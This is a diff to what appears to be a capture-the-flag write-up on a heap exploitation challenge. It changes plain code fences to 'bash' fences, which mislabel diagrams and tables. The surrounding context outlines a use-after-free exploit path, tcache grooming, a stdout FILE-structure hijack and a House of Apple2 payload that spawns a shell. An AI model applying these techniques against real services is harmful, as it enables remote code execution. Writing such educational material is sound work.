@@ -27,7 +27,7 @@
 
 The `server` binary implements a heap management service with three operations:
 
-```
+```bash
 Main Menu:
   1. create <size>     - Allocate chunk on heap
   2. update <idx> <offset> <data> - Write to chunk (WITH OFFSET)
@@ -59,7 +59,7 @@ void update(int index, char* data, int offset) {
 
 **Exploitation Path:**
 
-```
+```bash
 1. create(0x100)        → idx=0, chunks[0] = heap_address
 2. delete(0)            → free(chunks[0]), but chunks[0] still valid
 3. update(0, evil, 0)   → Write to freed memory!
@@ -93,7 +93,7 @@ guard = create(0x18)
 
 **Heap State After Grooming:**
 
-```
+```bash
 Tcache 0x90 bin (FULL - 7 chunks):
 [chunk_0] → [chunk_1] → ... → [chunk_6]
 
@@ -124,7 +124,7 @@ delete(fake_size_msb)
 
 **Memory Corruption Result:**
 
-```
+```bash
 tcache_perthread_struct (before):
 ├─ Bin[0x31]: chunk_A → NULL
 ├─ Bin[0x3e0]: chunk_B → NULL
@@ -153,7 +153,7 @@ stdout_chunk = create(0x28)
 
 **Result:**
 
-```
+```bash
 Heap Layout:
 ┌──────────────────────┐
 │ chunks[stdout_chunk] │  ← Points to stdout structure
@@ -201,7 +201,7 @@ if (file->_flags & 0xfbad0000) {  // Magic check
 
 Instead of calling `system()` directly, we hijack FILE structure operations:
 
-```
+```bash
 Program calls: puts(buffer)
     ↓
 glibc checks: buffer._IO_write_ptr > buffer._IO_write_base?
@@ -237,7 +237,7 @@ payload = file.house_of_apple2_execmd_when_do_IO_operation(
 
 **Payload Structure (232 bytes):**
 
-```
+```bash
 Offset  Field               Value
 ──────  ──────────────────  ─────────────────────────
 0x00    _flags              0x2068732f6e696220 (\"  sh\x00...\")
